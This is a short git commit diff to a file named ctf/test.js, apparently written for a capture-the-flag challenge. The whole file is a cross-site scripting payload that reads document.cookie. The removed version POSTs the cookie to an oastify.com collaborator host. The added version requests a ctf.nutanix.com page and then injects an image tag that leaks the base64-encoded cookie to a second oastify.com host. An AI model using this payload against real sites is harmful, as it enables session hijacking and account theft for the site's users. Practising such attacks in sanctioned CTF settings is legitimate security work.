933460f892c8d6c386b8b1b40b86324578bf7ef7
Saurabh <skumar1@mt.iitr.ac.in>
2022-09-21 10:29:47 +0530

    Update test.js

--- ctf/test.js
+++ ctf/test.js
@@ -1,8 +1,7 @@
 const xhr = new XMLHttpRequest();
-xhr.open("POST", 'http://3aemmo21fflhfvxlmtn8u644rvxmlb.oastify.com', true);
+xhr.open("GET", 'https://nucalc3-6848907864.ctf.nutanix.com/', true);
 let ck = document.cookie;
-xhr.onreadystatechange = () => { 
-  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-  }
-}
-xhr.send(ck);
+xhr.onreadystatechange = function() {
+  document.write('<img src=http://w30mh75olm56uzy7ch3tfv9ev51vpk.oastify.com/leak.txt?' + btoa(ck) + '>');
+};
+xhr.send();
